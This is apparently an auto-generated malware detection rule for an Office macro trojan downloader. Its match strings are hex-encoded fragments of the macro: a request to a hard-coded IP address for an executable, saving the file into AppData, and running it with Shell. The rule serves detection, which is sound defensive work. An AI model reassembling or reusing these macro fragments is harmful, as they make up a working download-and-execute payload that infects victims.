
rule TrojanDownloader_O97M_EncDoc_SJJ_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SJJ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 01 00 "
		
	strings :
		$a_01_0 = {2e 4f 70 65 6e 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 34 37 34 35 35 34 22 29 2c 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 36 38 37 34 37 34 22 29 20 26 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 37 30 33 61 32 66 32 66 33 33 33 37 32 65 33 32 33 33 33 33 32 65 33 31 33 30 33 32 32 65 33 33 33 35 32 66 36 34 37 37 36 31 32 65 36 35 37 38 36 35 22 29 2c 20 46 61 6c 73 65 } //01 00  .Open otvbpwmuptojdjd("474554"), otvbpwmuptojdjd("687474") & otvbpwmuptojdjd("703a2f2f33372e3233332e3130322e33352f6477612e657865"), False
		$a_01_1 = {3d 20 45 6e 76 69 72 6f 6e 28 22 41 70 70 44 61 74 61 22 29 } //01 00  = Environ("AppData")
		$a_01_2 = {2e 54 79 70 65 20 3d 20 31 } //01 00  .Type = 1
		$a_01_3 = {2e 77 72 69 74 65 20 72 64 70 75 77 78 78 72 64 78 73 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 } //01 00  .write rdpuwxxrdxs.responseBody
		$a_01_4 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 68 70 74 65 65 75 71 65 6f 65 6d 78 78 74 20 26 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 35 63 36 34 37 37 36 31 32 65 36 35 22 29 20 26 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 37 38 36 35 22 29 2c 20 32 } //01 00  .savetofile hpteeuqeoemxxt & otvbpwmuptojdjd("5c6477612e65") & otvbpwmuptojdjd("7865"), 2
		$a_01_5 = {53 68 65 6c 6c 20 28 68 70 74 65 65 75 71 65 6f 65 6d 78 78 74 20 26 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 35 63 36 34 37 37 36 31 22 29 20 26 20 6f 74 76 62 70 77 6d 75 70 74 6f 6a 64 6a 64 28 22 32 65 36 35 37 38 36 35 22 29 29 } //01 00  Shell (hpteeuqeoemxxt & otvbpwmuptojdjd("5c647761") & otvbpwmuptojdjd("2e657865"))
		$a_01_6 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 63 72 65 65 6e 55 70 64 61 74 69 6e 67 20 3d 20 54 72 75 65 } //00 00  Application.ScreenUpdating = True
	condition:
		any of ($a_*)
 
}